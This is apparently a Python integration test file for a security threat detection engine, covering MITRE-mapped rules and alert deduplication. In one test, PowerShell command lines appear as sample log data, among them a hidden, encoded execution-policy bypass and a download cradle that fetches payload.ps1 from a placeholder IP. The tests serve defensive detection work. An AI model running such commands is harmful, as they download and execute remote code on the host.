"""Integration tests for Threat Detection Engine API and deduplication."""

from datetime import datetime, timedelta, timezone

from app.core.enums import LogSeverity
from app.db.init_db import init_db
from app.models.security_alert import SecurityAlert
from app.models.security_log import SecurityLog
from app.services.log_generator import generate_synthetic_logs

BASE_TIME = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)


def test_detection_run_and_mitre_linkage(client, db_session):
    """Test POST /api/v1/detection/run execution and MITRE technique linkage."""
    init_db(target_engine=db_session.get_bind(), session_factory=lambda: db_session)

    # Ingest synthetic logs
    logs_data = generate_synthetic_logs(seed=123)
    for entry in logs_data:
        db_session.add(SecurityLog(**entry))
    db_session.commit()

    # First detection run
    res1 = client.post("/api/v1/detection/run")
    assert res1.status_code == 200
    data1 = res1.json()

    assert data1["rules_executed"] == 4
    assert data1["total_alerts_created"] >= 4
    assert data1["alerts_per_rule"]["RULE-T1110"] >= 1
    assert data1["alerts_per_rule"]["RULE-T1078"] >= 1
    assert data1["alerts_per_rule"]["RULE-T1046"] >= 1
    assert data1["alerts_per_rule"]["RULE-T1059.001"] >= 1

    # Verify MITRE linkage
    alerts = db_session.query(SecurityAlert).all()
    assert len(alerts) == data1["total_alerts_created"]
    for alert in alerts:
        assert alert.mitre_technique_id is not None
        assert alert.mitre_technique is not None
        assert alert.mitre_technique.technique_id in {"T1110", "T1078", "T1046", "T1059.001"}
        assert alert.status.value == "open"


def test_deduplication_same_logs_vs_new_incident_same_ip(client, db_session):
    """Test deduplication per incident:

    Case 1: Same logs processed twice -> no duplicate alert.
    Case 2: A NEW attack from the SAME IP 2 hours later -> a NEW alert must be created.
    """
    init_db(target_engine=db_session.get_bind(), session_factory=lambda: db_session)

    # Incident 1: 5 auth_failures from 192.168.1.99 at 10:00 - 10:02
    incident_1_logs = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 20),
            source_ip="192.168.1.99",
            destination_ip="10.0.0.1",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(5)
    ]
    for log in incident_1_logs:
        db_session.add(log)
    db_session.commit()

    # Run detection on Incident 1
    res1 = client.post("/api/v1/detection/run")
    assert res1.status_code == 200
    assert res1.json()["total_alerts_created"] == 1
    assert db_session.query(SecurityAlert).count() == 1

    # Case 1: Run detection AGAIN on the same logs -> 0 new alerts
    res_repeat = client.post("/api/v1/detection/run")
    assert res_repeat.status_code == 200
    assert res_repeat.json()["total_alerts_created"] == 0
    assert db_session.query(SecurityAlert).count() == 1, "Duplicate alert was created for same logs!"

    # Case 2: Incident 2 occurs 2 hours later (12:00) from the SAME IP (192.168.1.99)
    two_hours_later = BASE_TIME + timedelta(hours=2)
    incident_2_logs = [
        SecurityLog(
            timestamp=two_hours_later + timedelta(seconds=i * 20),
            source_ip="192.168.1.99",
            destination_ip="10.0.0.1",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(5)
    ]
    for log in incident_2_logs:
        db_session.add(log)
    db_session.commit()

    # Run detection -> MUST create a NEW alert for the new incident
    res2 = client.post("/api/v1/detection/run")
    assert res2.status_code == 200
    assert res2.json()["total_alerts_created"] == 1, "Expected new alert for distinct incident from same IP"
    assert db_session.query(SecurityAlert).count() == 2

    # Verify both alerts are for 192.168.1.99 with distinct timestamps
    alerts = db_session.query(SecurityAlert).order_by(SecurityAlert.detection_time).all()
    assert alerts[0].source_ip == "192.168.1.99"
    assert alerts[1].source_ip == "192.168.1.99"
    assert alerts[0].detection_time < alerts[1].detection_time


def test_deduplication_burst_expansion_and_template_independence(client, db_session):
    """Test comprehensive incident deduplication requirements:
    1. 7 auth failures within 90 seconds -> exactly 1 alert
    2. Run detection, add 2 more failures inside the same burst, run again -> still 1 alert with updated count
    3. Same IP attacks again 2 hours later -> 2 alerts total
    4. Changing the description template must not break deduplication
    """
    init_db(target_engine=db_session.get_bind(), session_factory=lambda: db_session)

    attacker_ip = "192.168.1.55"

    # Step 1: 7 auth failures within 90 seconds (spaced 12s apart = 72s span)
    burst_1 = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=i * 12),
            source_ip=attacker_ip,
            destination_ip="10.0.0.1",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(7)
    ]
    for log in burst_1:
        db_session.add(log)
    db_session.commit()

    # 1. 7 auth failures within 90 seconds -> exactly 1 alert
    res1 = client.post("/api/v1/detection/run")
    assert res1.status_code == 200
    assert res1.json()["total_alerts_created"] == 1
    assert db_session.query(SecurityAlert).count() == 1

    alert1 = db_session.query(SecurityAlert).first()
    assert alert1.rule_id == "RULE-T1110"
    assert alert1.source_ip == attacker_ip
    assert "7 failed authentication events" in alert1.description
    assert alert1.incident_start.replace(tzinfo=timezone.utc) == BASE_TIME

    # Step 2: Add 2 more failures inside the same burst (at +84s and +96s)
    burst_1_ext = [
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=84),
            source_ip=attacker_ip,
            destination_ip="10.0.0.1",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        ),
        SecurityLog(
            timestamp=BASE_TIME + timedelta(seconds=96),
            source_ip=attacker_ip,
            destination_ip="10.0.0.1",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        ),
    ]
    for log in burst_1_ext:
        db_session.add(log)
    db_session.commit()

    # 2. Run again -> still 1 alert with updated count
    res2 = client.post("/api/v1/detection/run")
    assert res2.status_code == 200
    assert res2.json()["total_alerts_created"] == 0, "No new alert should be created for same expanded burst"
    assert db_session.query(SecurityAlert).count() == 1

    db_session.refresh(alert1)
    assert "9 failed authentication events" in alert1.description
    assert alert1.detection_time.replace(tzinfo=timezone.utc) == BASE_TIME + timedelta(seconds=96)

    # Step 3: Same IP attacks again 2 hours later
    two_hours_later = BASE_TIME + timedelta(hours=2)
    burst_2 = [
        SecurityLog(
            timestamp=two_hours_later + timedelta(seconds=i * 10),
            source_ip=attacker_ip,
            destination_ip="10.0.0.1",
            username="admin",
            event_type="auth_failure",
            severity=LogSeverity.LOW,
        )
        for i in range(5)
    ]
    for log in burst_2:
        db_session.add(log)
    db_session.commit()

    # 3. Same IP attacks again 2 hours later -> 2 alerts total
    res3 = client.post("/api/v1/detection/run")
    assert res3.status_code == 200
    assert res3.json()["total_alerts_created"] == 1
    assert db_session.query(SecurityAlert).count() == 2

    # Step 4: Changing the description template must not break deduplication
    # Manually alter the description text of alert1 in DB to simulate template modification
    alert1.description = "Customized template text: Brute force occurred on host 192.168.1.55"
    db_session.commit()

    # Run detection again with the modified description template in DB
    res4 = client.post("/api/v1/detection/run")
    assert res4.status_code == 200
    assert res4.json()["total_alerts_created"] == 0, "Template modification must NOT break deduplication"
    assert db_session.query(SecurityAlert).count() == 2


def test_deduplication_matches_and_migrates_legacy_alerts(client, db_session):
    """Test that legacy alerts without rule_id / incident_start are matched via mitre_technique_id and backfilled."""
    init_db(target_engine=db_session.get_bind(), session_factory=lambda: db_session)

    from app.core.enums import AlertSeverity, AlertStatus
    from app.models.mitre_technique import MitreTechnique

    tech = db_session.query(MitreTechnique).filter(MitreTechnique.technique_id == "T1110").first()
    attacker_ip = "192.168.1.88"

    # Ingest 5 auth failures
    for i in range(5):
        db_session.add(
            SecurityLog(
                timestamp=BASE_TIME + timedelta(seconds=i * 20),
                source_ip=attacker_ip,
                destination_ip="10.0.0.1",
                username="admin",
                event_type="auth_failure",
                severity=LogSeverity.LOW,
            )
        )

    # Pre-seed a legacy alert without rule_id, incident_start, or incident_key
    legacy_alert = SecurityAlert(
        title="Legacy Brute Force Alert",
        description="Old description from Phase 3/4 before structured keys",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.OPEN,
        source_ip=attacker_ip,
        rule_id=None,
        incident_start=None,
        incident_key=None,
        detection_time=BASE_TIME + timedelta(seconds=80),
        mitre_technique_id=tech.id,
    )
    db_session.add(legacy_alert)
    db_session.commit()

    # Run detection: must match legacy alert via mitre_technique_id, update it, and backfill rule_id
    res = client.post("/api/v1/detection/run")
    assert res.status_code == 200
    assert res.json()["total_alerts_created"] == 0, "Legacy alert must be matched and updated, not duplicated"
    assert db_session.query(SecurityAlert).count() == 1

    db_session.refresh(legacy_alert)
    assert legacy_alert.rule_id == "RULE-T1110"
    assert legacy_alert.incident_start is not None
    assert legacy_alert.incident_key is not None
    assert "failed authentication events" in legacy_alert.description


def test_powershell_in_place_update_preserves_earlier_evidence(client, db_session):
    """Test that in-place updates on PowerShell incidents append evidence and NEVER overwrite earlier evidence."""
    init_db(target_engine=db_session.get_bind(), session_factory=lambda: db_session)

    host_ip = "10.0.1.75"
    cmd1_time = BASE_TIME
    cmd2_time = BASE_TIME + timedelta(minutes=2)

    cmd1_text = "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc SQBFAFgA"
    cmd2_text = 'powershell.exe -NoProfile -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.50/payload.ps1\')"'

    # Step 1: Add command 1 log and run detection
    log1 = SecurityLog(
        timestamp=cmd1_time,
        source_ip=host_ip,
        destination_ip="10.0.0.1",
        event_type="process_creation",
        command_line=cmd1_text,
        severity=LogSeverity.HIGH,
    )
    db_session.add(log1)
    db_session.commit()

    res1 = client.post("/api/v1/detection/run")
    assert res1.status_code == 200
    assert res1.json()["total_alerts_created"] == 1
    assert db_session.query(SecurityAlert).count() == 1

    alert = db_session.query(SecurityAlert).first()
    assert alert.rule_id == "RULE-T1059.001"
    assert "1 matched command" in alert.description
    assert cmd1_time.strftime("%Y-%m-%dT%H:%M:%S") in alert.description
    assert "-executionpolicy bypass" in alert.description

    # Step 2: Add command 2 log (2m later, within 5m window) and run detection again
    log2 = SecurityLog(
        timestamp=cmd2_time,
        source_ip=host_ip,
        destination_ip="10.0.0.1",
        event_type="process_creation",
        command_line=cmd2_text,
        severity=LogSeverity.HIGH,
    )
    db_session.add(log2)
    db_session.commit()

    res2 = client.post("/api/v1/detection/run")
    assert res2.status_code == 200
    assert res2.json()["total_alerts_created"] == 0, "Second command in window must update in-place, not create duplicate"
    assert db_session.query(SecurityAlert).count() == 1

    # Verify that earlier evidence was PRESERVED and new evidence was APPENDED
    db_session.refresh(alert)
    desc = alert.description
    assert "2 matched commands" in desc, "Header must reflect 2 matched commands"
    # Evidence for command 1 preserved:
    assert cmd1_time.strftime("%Y-%m-%dT%H:%M:%S") in desc
    assert "-executionpolicy bypass" in desc
    assert "SQBFAFgA" in desc
    # Evidence for command 2 appended:
    assert cmd2_time.strftime("%Y-%m-%dT%H:%M:%S") in desc
    assert "downloadstring" in desc
    assert "198.51.100.50" in desc
    # End time updated:
    assert alert.detection_time.replace(tzinfo=timezone.utc) == cmd2_time


def test_deduplication_status_scope_open_investigating_resolved_false_positive(client, db_session):
    """Test deduplication status scope:
    - Status 'open' or 'investigating': matches existing incident, absorbs new events (in-place update, 0 new alerts)
    - Status 'resolved' or 'false_positive': does NOT absorb new events (creates a new alert)
    """
    init_db(target_engine=db_session.get_bind(), session_factory=lambda: db_session)

    from app.core.enums import AlertSeverity, AlertStatus
    from app.models.mitre_technique import MitreTechnique

    tech = db_session.query(MitreTechnique).filter(MitreTechnique.technique_id == "T1110").first()

    # Case 1: Status 'investigating' DOES absorb new events in same window
    ip_inv = "192.168.1.101"
    alert_inv = SecurityAlert(
        title="Investigating Brute Force",
        description="Analyst investigating",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.INVESTIGATING,
        source_ip=ip_inv,
        rule_id="RULE-T1110",
        incident_start=BASE_TIME,
        detection_time=BASE_TIME + timedelta(seconds=60),
        mitre_technique_id=tech.id,
    )
    db_session.add(alert_inv)
    # Add logs in same window
    for i in range(5):
        db_session.add(
            SecurityLog(
                timestamp=BASE_TIME + timedelta(seconds=i * 15),
                source_ip=ip_inv,
                destination_ip="10.0.0.1",
                event_type="auth_failure",
                severity=LogSeverity.LOW,
            )
        )
    db_session.commit()

    res_inv = client.post("/api/v1/detection/run")
    assert res_inv.status_code == 200
    assert res_inv.json()["alerts_per_rule"]["RULE-T1110"] == 0, "Investigating alert must absorb events, creating 0 new alerts"

    # Case 2: Status 'resolved' does NOT absorb new events (creates a new alert)
    ip_res = "192.168.1.102"
    alert_res = SecurityAlert(
        title="Resolved Brute Force",
        description="Ticket closed by analyst",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.RESOLVED,
        source_ip=ip_res,
        rule_id="RULE-T1110",
        incident_start=BASE_TIME,
        detection_time=BASE_TIME + timedelta(seconds=60),
        mitre_technique_id=tech.id,
    )
    db_session.add(alert_res)
    for i in range(5):
        db_session.add(
            SecurityLog(
                timestamp=BASE_TIME + timedelta(seconds=i * 15),
                source_ip=ip_res,
                destination_ip="10.0.0.1",
                event_type="auth_failure",
                severity=LogSeverity.LOW,
            )
        )
    db_session.commit()

    res_res = client.post("/api/v1/detection/run")
    assert res_res.status_code == 200
    assert res_res.json()["alerts_per_rule"]["RULE-T1110"] == 1, "Resolved alert must NOT absorb events; new alert must be created"

    # Case 3: Status 'false_positive' does NOT absorb new events (creates a new alert)
    ip_fp = "192.168.1.103"
    alert_fp = SecurityAlert(
        title="FP Brute Force",
        description="Marked as false positive",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.FALSE_POSITIVE,
        source_ip=ip_fp,
        rule_id="RULE-T1110",
        incident_start=BASE_TIME,
        detection_time=BASE_TIME + timedelta(seconds=60),
        mitre_technique_id=tech.id,
    )
    db_session.add(alert_fp)
    for i in range(5):
        db_session.add(
            SecurityLog(
                timestamp=BASE_TIME + timedelta(seconds=i * 15),
                source_ip=ip_fp,
                destination_ip="10.0.0.1",
                event_type="auth_failure",
                severity=LogSeverity.LOW,
            )
        )
    db_session.commit()

    res_fp = client.post("/api/v1/detection/run")
    assert res_fp.status_code == 200
    assert res_fp.json()["alerts_per_rule"]["RULE-T1110"] == 1, "False positive alert must NOT absorb events; new alert must be created"



